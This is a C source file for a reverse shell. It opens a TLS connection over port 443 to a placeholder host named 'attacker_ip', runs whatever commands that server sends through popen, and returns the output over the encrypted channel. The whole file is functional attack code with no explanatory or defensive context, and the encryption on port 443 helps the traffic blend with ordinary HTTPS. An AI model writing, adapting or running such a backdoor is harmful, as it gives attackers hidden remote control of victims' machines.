#include <stdio.h>  // For popen() and FILE type
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/bio.h>

#define SERVER "attacker_ip"
#define PORT 443

void connect_to_server(SSL_CTX *ctx, SSL **ssl) {
    BIO *bio = BIO_new_ssl_connect(ctx);
    char server[256];

    sprintf(server, "%s:%d", SERVER, PORT);
    BIO_set_conn_hostname(bio, server);

    SSL *ssl_obj = NULL;
    BIO_get_ssl(bio, &ssl_obj);
    *ssl = ssl_obj;

    if (BIO_do_connect(bio) <= 0) {
        printf("Error connecting to server\n");
        exit(1);
    }

    if (BIO_do_handshake(bio) <= 0) {
        printf("Error during SSL handshake\n");
        exit(1);
    }
}

int main() {
    SSL_CTX *ctx;
    SSL *ssl;
    char buffer[1024];
    FILE *fp;

    // Initialize SSL
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    const SSL_METHOD *method = TLS_client_method();
    ctx = SSL_CTX_new(method);
    if (!ctx) {
        perror("Unable to create SSL context");
        exit(1);
    }

    // Connect to the server
    connect_to_server(ctx, &ssl);

    while (1) {
        // Read data from the server (command to execute)
        int bytes = SSL_read(ssl, buffer, sizeof(buffer) - 1);
        if (bytes <= 0) {
            break;
        }
        buffer[bytes] = '\0';

        // Execute the command
        fp = popen(buffer, "r");
        if (fp == NULL) {
            perror("popen failed");  // Detailed error message
            const char *error_msg = "Error executing command\n";
            SSL_write(ssl, error_msg, strlen(error_msg));
        } else {
            while (fgets(buffer, sizeof(buffer), fp) != NULL) {
                SSL_write(ssl, buffer, strlen(buffer));
            }
            fclose(fp);
        }
    }

    SSL_shutdown(ssl);
    SSL_free(ssl);
    SSL_CTX_free(ctx);
    return 0;
}
